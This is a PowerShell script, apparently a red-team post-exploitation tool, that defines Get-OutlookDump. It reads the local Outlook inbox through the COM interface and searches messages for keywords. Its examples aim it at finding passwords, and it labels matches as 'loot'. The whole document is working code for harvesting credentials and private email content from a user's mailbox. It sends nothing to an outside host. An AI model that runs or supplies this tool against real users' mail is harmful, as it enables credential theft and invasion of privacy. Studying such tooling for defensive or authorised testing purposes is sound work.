#@redfr0g 2020

Function Get-OutlookDump{

 <#
        .SYNOPSIS
        Dumps emails from local Microsoft Outlook service and can search for keywords in them.

        .DESCRIPTION
        Use Search parameter to search for the keyword in emails.
        Tune the search by excluding certain keywords with Exclude parameter.

        .PARAMETER Search
        Specifies the keyword to search in the mail dump.

        .PARAMETER Exclude
        Specifies the excluded keywords. You can narrow the search output with this.

        .PARAMETER Limit
        Limits the search and dump.

        .INPUTS
        None.

        .OUTPUTS
        System.String.

        .EXAMPLE
        Search for "Pass".

        C:\PS> Get-OutlookDump -Search Pass

        .EXAMPLE
        Search for "Pass" and exclude "Passport".

        C:\PS> Get-OutlookDump -Search Pass -Exclude Passport

        .EXAMPLE
         Search for "Pass" and exclude "Passport" and limit search to 100 emails.

        C:\PS> Get-OutlookDump -Search Pass -Exclude Passport -Limit 100
        Password:StrongPwd
        -------------------------------------------------
        Found in mail number: 59 

        .EXAMPLE
        Get email by its index.

        C:\PS> Get-OutlookDump -Index 59
             
        .LINK
        https://brzozowski.xyz

    #>


    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $False)][String]$Search,
        [Parameter(Mandatory = $False)][String]$Exclude,
        [Parameter(Mandatory = $False)][Int]$Limit,
        [Parameter(Mandatory = $False)][Int]$Index

    )

    $outlook = New-Object -ComObject outlook.application
    $olFolders ="Microsoft.Office.Interop.Outlook.OlDefaultFolders" -as [type]
    $namespace = $Outlook.GetNameSpace("MAPI")
    $inbox = $namespace.GetDefaultFolder($olFolders::olFolderInbox)
    $count = $inbox.items.count
    $nl = [Environment]::NewLine

    if(!($Search) -And !($Exclude) -And !($Limit) -and !($Index)){

    $inbox.Items

    }
    elseif(!($Search) -And !($Exclude) -and $Limit){
    
     1..$Limit | %{$inbox.Items.Item($_)}
    
    }
    elseif(!($Exclude) -And !($Limit) -And $Search){
        
    1..$count| %{$loot = ($inbox.Items.Item($_) | Out-String -Stream | Select-String -Pattern $Search -SimpleMatch);if($loot) {Write-Output $loot $nl;Write-Output "-------------------------------------------------"; Write-Output "Found in mail number: $_  $nl$nl"}}

    }
    elseif(!($Exclude) -and $Limit -and $Search){
        
    1..$Limit| %{$loot = ($inbox.Items.Item($_) | Out-String -Stream | Select-String -Pattern $Search -SimpleMatch);if($loot) {Write-Output $loot $nl;Write-Output "-------------------------------------------------"; Write-Output "Found in mail number: $_  $nl$nl"}}

    }
    elseif(!($Limit) -and $Search -and $Exclude){
        
    1..$count| %{$loot = ($inbox.Items.Item($_) | Out-String -Stream | Select-String -Pattern $Search -SimpleMatch | Select-String -Pattern $Exclude -NotMatch);if($loot) {Write-Output $loot $nl;Write-Output "-------------------------------------------------"; Write-Output "Found in mail number: $_  $nl$nl"}}

    }
    elseif($Limit -and $Exclude -and $Search){
    
    1..$Limit| %{$loot = ($inbox.Items.Item($_) | Out-String -Stream | Select-String -Pattern $Search -SimpleMatch | Select-String -Pattern $Exclude -NotMatch);if($loot) {Write-Output $loot $nl;Write-Output "-------------------------------------------------"; Write-Output "Found in mail number: $_  $nl$nl"}}
    
    }
    elseif($Index -And !($Search) -And !($Exclude) -And !($Limit)){
    
    $inbox.Items.Item($Index)
    }
    

}